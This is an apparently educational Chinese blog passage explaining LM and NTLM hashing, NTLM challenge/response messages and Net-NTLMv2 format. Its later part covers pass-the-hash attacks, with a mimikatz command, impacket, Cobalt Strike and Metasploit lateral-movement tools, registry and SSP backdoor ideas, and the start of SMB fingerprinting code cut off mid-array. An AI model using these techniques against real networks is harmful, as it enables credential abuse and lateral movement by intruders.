<p>其中的<code>AAD3B435B51404EEAAD3B435B51404EE</code>是LM Hash<br>​<br><code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是NTLM Hash</p>
<p>下面详细介绍下这两种hash格式。</p>
<h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>全称是LAN Manager Hash, windows最早用的加密算法，由IBM设计。</p>
<p>LM Hash的计算:</p>
<ol>
<li>用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li>
<li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</li>
<li>再分7bit为一组,每组末尾加0，再组成一组</li>
<li>上步骤得到的二组，分别作为key 为 <code>KGS!@#$%</code>进行DES加密。</li>
<li>将加密后的两组拼接在一起，得到最终LM HASH值。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_just</span>(<span class="params">length,text</span>):</span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) <span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0172bd50f22e19481b.png"></p>
<p>LM加密算法存在一些固有的漏洞</p>
<ol>
<li><p>首先，密码长度最大只能为14个字符</p>
</li>
<li><p>密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</p>
</li>
<li><p>查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到lm hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</p>
</li>
<li><p>一个14个字符的密码分成7 + 7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度大大降低，这使得14个字符的密码的有效强度等于，7个字符的密码的两倍，该密码的复杂度明显低于  14个字符的密码的理论强度。</p>
</li>
<li><p>Des密码强度不高</p>
</li>
</ol>
<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b500665781a9a455.png"></p>
<p>其中</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01004834cdf230e43d.png"></p>
<p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。(因此后面我们介绍身份认证的时候只介绍Net-ntlm，不再介绍net-lm)如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。</p>
<p>所以在win7 中我们看到抓到LM Hash都是<code>AAD3B435B51404EEAAD3B435B51404EE</code>，这里的LM Hash并没有价值。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018c4fbb07e30d463f.png"></p>
<p>但某些工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash。</p>
<p>接下来讲下NTLM Hash的计算</p>
<ol>
<li>先将用户密码转换为十六进制格式。</li>
<li>将十六进制格式的密码进行Unicode编码。</li>
<li>使用MD4摘要算法对Unicode编码数据进行Hash计算</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python2 <span class="literal">-c</span> <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d1c6be66d5b0c4f.png"></p>
<h3 id="NTLM身份验证"><a href="#NTLM身份验证" class="headerlink" title="NTLM身份验证"></a>NTLM身份验证</h3><p>NTLM验证是一种Challenge&#x2F;Response 验证机制，由三种消息组成:通常称为<code>type 1(协商)</code>，<code>类型type 2(质询)</code>和<code>type 3(身份验证)</code>。</p>
<p>它基本上是这样工作的:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0dfdfd6d7007c80.png"></p>
<ol>
<li><p>用户登录客户端电脑</p>
</li>
<li><p>(type 1)客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。</p>
</li>
<li><p>(type 2)服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</p>
</li>
<li><p>(type 3)客户端用type 3消息(身份验证)回复质询。用户接收到步骤3中的challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challeng发给服务器。消息中的response是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</p>
</li>
<li><p>服务器拿到type 3之后，使用challenge和用户hash进行加密得到response2与type 3发来的response进行比较。如果用户hash是存储在域控里面的话，那么没有用户hash，也就没办法计算response2。也就没法验证。这个时候用户服务器就会通过netlogon协议联系域控，建立一个安全通道,然后将type 1,type 2，type3 全部发给域控(这个过程也叫作Pass Through Authentication认证流程)</p>
</li>
<li><p>域控使用challenge和用户hash进行加密得到response2，与type 3的response进行比较</p>
</li>
</ol>
<p>下面简单介绍下三个过程，如果对于细节不感兴趣的话就可以忽略。</p>
<h4 id="type-1-协商"><a href="#type-1-协商" class="headerlink" title="type 1 协商"></a>type 1 协商</h4><p>这个过程是客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec11da7d0c1ee154.png"></p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0144831acec02cd75f.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p>
<h4 id="type-2-质询"><a href="#type-2-质询" class="headerlink" title="type 2 质询"></a>type 2 质询</h4><p>这个过程是服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01356cac29ba604cbb.png"></p>
<p>其中最主要的信息是challenge。后面加密验证依赖于challenge</p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017f0ae4b36b11e5ae.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">CHALLENGE_MESSAGE</a></p>
<h4 id="type-3-身份验证"><a href="#type-3-身份验证" class="headerlink" title="type 3 身份验证"></a>type 3 身份验证</h4><p>这个过程客户端接收到challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challenge发给服务器。消息中的response是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015806cf60eb39a716.png"></p>
<p>这里的Challeng不同于type2 的Challenge，这里的Challenge是一个随机的客户端nonce。</p>
<p>MIC是校验和，设计MIC主要是为了防止这个包中途被修改</p>
<p>session_key是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说session_key就是加密密钥，需要拥有用户hash才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个session_key已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。</p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010fe86d086e7fb634.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce">AUTHENTICATE_MESSAGE</a></p>
<h3 id="Net-ntlm-hash"><a href="#Net-ntlm-hash" class="headerlink" title="Net-ntlm hash"></a>Net-ntlm hash</h3><p>在type3中的响应，有六种类型的响应</p>
<ul>
<li><p>LM(LAN Manager)响应 - 由大多数较早的客户端发送，这是<code>原始</code>响应类型。</p>
</li>
<li><p>NTLM v1响应 - 这是由基于NT的客户端发送的，包括Windows 2000和XP。</p>
</li>
<li><p>NTLMv2响应 - 在<code>Windows NT Service Pack 4</code>中引入的一种较新的响应类型。它替换启用了 NTLM版本2的系统上的NTLM响应。</p>
</li>
<li><p>LMv2响应 - 替代NTLM版本2系统上的LM响应。</p>
</li>
<li><p>NTLM2会话响应 - 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义。</p>
</li>
<li><p>匿名响应 - 当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存 根”字段显示在类型3消息中。<br>这六种使用的加密流程一样，都是前面我们说的 <code>Challenge/Response</code> 验证机制,区别在Challenge和加密算法不同。<br>这里我们侧重讲下NTLM v1响应和NTLMv2响应</p>
</li>
<li><p>v2是16位的Challenge，而v1是8位的Challenge</p>
</li>
<li><p>v1是将 16字节的NTLM hash空填充为21个字节，然后分成三组，每组7比特，作为3DES加密算法的三组密钥，加密Server发来的Challenge。 将这三个密文值连接起来得到response。</p>
</li>
</ul>
<p>而v2是的加密算法是:</p>
<pre><code>1. 将Unicode后的大写用户名与Unicode后的身份验证目标（在Type 3消息的`TargetName`字段中指定的域或服务器名称）拼在一起。请注意，用户名将转换为大写，而身份验证目标区分大小写，并且必须与`TargetName`字段中显示的大小写匹配。使用16字节NTLM哈希作为密钥，得到一个值。

​2. 构建一个blob信息。

​3. 使用16字节NTLMv2哈希作为密钥，将HMAC-MD5消息认证代码算法加密一个值(来自type 2的Challenge与Blob拼接在一起)。得到一个16字节的NTProofStr。

​4. 将NTProofStr与Blob拼接起来形成得到response。
</code></pre>
<p>至于选择哪个版本的响应由LmCompatibilityLevel决定。</p>
<p>Challenge&#x2F;Response验证机制里面type3 response里面包含Net-ntlm hash，NTLM v1响应和NTLMv2响应对应的就是Net-ntlm hash分为Net-ntlm hash v1和Net-ntlm hash v2。</p>
<p>Net-ntlm hash v1的格式为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>

<p>Net-ntlm hash v2的格式为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>

<p>下面演示从response里面提取NTLMv2</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010fe86d086e7fb634.png"></p>
<p>这里的challenge是type2 服务器返回的challenge不是type3 流量包里面的client Challenge</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0142cfbdda6bb0776f.png"></p>
<p>就是7ac429882efc7e29</p>
<p>HMAC-MD5对应数据包中的NTProofSt</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d094e48e096807a3.png"></p>
<p>就是</p>
<p><code>0101000000000000772eaacee59dd5014b484239683639570000000001000c00570049004e0037002d00310002000800540045005300540003002200570049004e0037002d0031002e0074006500730074002e006c006f00630061006c000400140074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800772eaacee59dd5010900160063006900660073002f00570049004e0037002d0031000000000000000000</code></p>
<p>所以最后的ntlm v2 hash是</p>
<p><code>win7::test.local:7ac429882efc7e29:00a9055c4007c7eb1c1386504d0a7162:0101000000000000772eaacee59dd5014b484239683639570000000001000c00570049004e0037002d00310002000800540045005300540003002200570049004e0037002d0031002e0074006500730074002e006c006f00630061006c000400140074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800772eaacee59dd5010900160063006900660073002f00570049004e0037002d0031000000000000000000</code></p>
<h3 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp; SSPI"></a>SSP &amp; SSPI</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018ada8ed1499cad3a.gif"></p>
<ul>
<li>SSPI(Security Support Provider Interface)</li>
</ul>
<p>这是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p>
<ul>
<li>SSP(Security Support Provider)<br>​<br>SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</li>
</ul>
<ol>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>Digest SSP</li>
<li>Negotiate SSP</li>
<li>Schannel SSP</li>
<li>Negotiate Extensions SSP</li>
<li>PKU2U SSP</li>
</ol>
<p>在系统层面，SSP就是一个dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge&#x2F;Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p>
<p>这个地方可以用于留作后门。这个地方就不详细展开了。下一篇域渗透详细展开</p>
<p>我们抓包分析ntlm的时候，就会看到ntlm是放在GSS-API里面</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec5c804dd71c97ac.png"></p>
<p>为啥这里会出现GSSAPI呢，SSPI是GSSAPI的一个专有变体，进行了扩展并具有许多特定于Windows的数据类型。SSPI生成和接受的令牌大多与GSS-API兼容。所以这里出现GSSAPI只是为了兼容，我们可以不必理会。可以直接从NTLM SSP开始看起。注册为SSP的一个好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。比如镶嵌在SMB协议里面是这样。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011a82a996098f3ed4.png"></p>
<p>镶嵌在HTTP协议里面是这样</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fb68938d1b14c1d6.png"></p>
<h3 id="LmCompatibilityLevel"><a href="#LmCompatibilityLevel" class="headerlink" title="LmCompatibilityLevel"></a>LmCompatibilityLevel</h3><p>此安全设置确定网络登录使用的质询&#x2F;响应身份验证协议。此选项会影响客户端使用的身份验证协议的等级、协商的会话安全的等级以及服务器接受的身份验证的等级，其设置值如下:</p>
<ul>
<li>发送 LM NTLM 响应: 客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>发送 LM &amp; NTLM - 如果协商一致，则使用 NTLMv2 会话安全: 客户端使用 LM 和 NTLM 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLM 响应: 客户端仅使用 NTLM 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLMv2 响应: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLMv2 响应\拒绝 LM: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器拒绝 LM (仅接受 NTLM 和 NTLMv2 身份验证)。</li>
<li>仅发送 NTLMv2 响应\拒绝 LM &amp; NTLM: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器拒绝 LM 和 NTLM (仅接受 NTLMv2 身份验证)。</li>
</ul>
<p>默认值:</p>
<ul>
<li>Windows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应</li>
<li>Windows Server 2003: 仅发送 NTLM 响应</li>
<li>Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2及以上: 仅发送 NTLMv2 响应</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01facab176e91e17e0.png"></p>
<h3 id="相关的安全问题-2"><a href="#相关的安全问题-2" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h4><p>也叫hash传递攻击,简称PTH。</p>
<p>在type3计算response的时候，客户端是使用用户的hash进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户hash。微软在2014年5月13日发布了针对Pass The Hash的更新补丁kb2871997，标题为<code>&quot;Update to fix the Pass-The-Hash Vulnerability&quot;</code>,而在一周后却把标题改成了<code>&quot;Update to improve credentials protection and management&quot;</code>。(事实上，这个补丁不仅能够缓解PTH,还能阻止mimikatz 抓取明文密码，本系列文章侧重于协议认证的问题，因此不在这里扩展介绍其他内容)。</p>
<ol>
<li>kb2871997</li>
</ol>
<p>这里来探讨下为啥kb2871997能缓解pth，又不能杜绝Pth。<br>首先kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名，接下来我们统称RID 500帐户)和本地管理员组的域用户是没有影响的。<br>在打了kb2871997补丁的机子上</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01af7412a309463115.png"></p>
<p>使用RID 500帐户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ff872e47cf0ff799.png"></p>
<p>使用本地管理员组的域用户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012819b8790a4facf8.png"></p>
<p>使用本地管理员组的非RID 500帐户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01259f0c2acb39aa9e.png"></p>
<p>发现ntlm认证通过之后，对ADMIN$没有写入权限。那么是什么阻止了我们对本地管理员组的非RID500帐户使用哈希传递？为什么RID 500帐户具有特殊情况？除此之外，为什么本地管理员成员的域帐户也可以免除这种阻止行为。(事实上，之前在winrm进行远程登录的时候我也遇到相关的问题，winrm远程登录只能使用RID 500帐户与本地管理员成员的域用户登录，不能使用本地管理员组的非RID500账户)</p>
<p>所有这些问题的真正罪魁祸首是远程访问上下文中的用户帐户控制（UAC）令牌筛选。</p>
<p>对于远程连接到Windows Vista +计算机的任何非RID 500本地管理员帐户，无论是通过WMI，PSEXEC还是其他方法(有个例外，那就是通过RDP远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌。</p>
<p>已过滤的管理员令牌有如下特征(深入解析Windows操作系统第六版P501)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188dd5b8aa3cf5882.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015632611ec4d6c090.png"></p>
<p>通俗点来说就是管理员组的非RID500账户登录之后是没有过UAC的，所有特权都被移除，除了上图的Change Notify之类的。而RID500账户登录之后也以完全管理特权（”完全令牌模式”）运行所有应用程序，实际是不用过UAC的，这个可以自己测试下。</p>
<p>对于本地“管理员”组中的域用户帐户，文档指出：</p>
<blockquote>
<p>当具有域用户帐户的用户远程登录Windows Vista计算机并且该用户是Administrators组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的UAC被禁用在该会话的远程计算机上</p>
</blockquote>
<p>如果<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>项存在(默认不存在)且配置为1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非RID 500帐户连接，并且可以成功传递哈希值！</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f560c775672372a.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ed703606a3d87b00.png"></p>
<p>默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，我们之前提过一嘴的，在配置winrm的时候，也会遇到同样的问题，本地管理员组的非RID500账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。</p>
<ol start="2">
<li>进行pth 的一些常用工具</li>
</ol>
<p>一般有两种场景底下需要用到pth，第一种是我们已知目标计算机的IP,用户名，hash尝试登陆目标主机。</p>
<p>另外一种场景就是我们在一个大型的内网环境底下获得一个用户的hash，尝试去撞整个内网的相同密码的主机，从而进行横向移动。下面列举部分pth的工具。</p>
<ul>
<li>mimikatz</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:win10 /domain:test.local /ntlm:<span class="number">6</span>a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d3f24855cbeb8b4d.png"></p>
<p>接下来就可以使用psecex,wmic,at之类的进行远程命令执行。</p>
<ul>
<li>impacket</li>
</ul>
<p>impacket底下执行远程命令执行的脚本有5个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">atexec.py</span><br><span class="line">wmiexec.py</span><br><span class="line">dcomexec.py</span><br></pre></td></tr></table></figure>

<p>都支持使用hash进行远程命令执行，通过–hashes指定hash,以psexec.py为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015f7186cbd504480c.png"></p>
<ul>
<li>cobalstrike</li>
</ul>
<p>cabalstrike支持批量得进行pth，在横向移动中撞密码hash中特别有效</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bb2d9b4e787eb560.png"></p>
<ul>
<li>msf</li>
</ul>
<p>msf的exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh模块是支持对一个网段进行pth的，在横向移动中撞密码hash中特别有效</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016cda2ad2b2312ccb.png"></p>
<h4 id="利用ntlm进行的信息收集"><a href="#利用ntlm进行的信息收集" class="headerlink" title="利用ntlm进行的信息收集"></a>利用ntlm进行的信息收集</h4><p>回顾type2 。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017f0ae4b36b11e5ae.png"></p>
<p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行ntlm 交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。前面我们说过ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们以SMB为例。在目标主机开放了445或者139的情况，通过给服务器发送一个type1的请求，然后解析type2的响应。就可以收集到一些信息。</p>
<p>直接上代码(代码来源<a href="https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html">c#版本的smb_version</a>)，大家也可以仿造代码的形式，自己实现其他上层协议下的信息收集。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Zcg.Tests</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">smbver</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] d1 =&#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x85</span>, <span 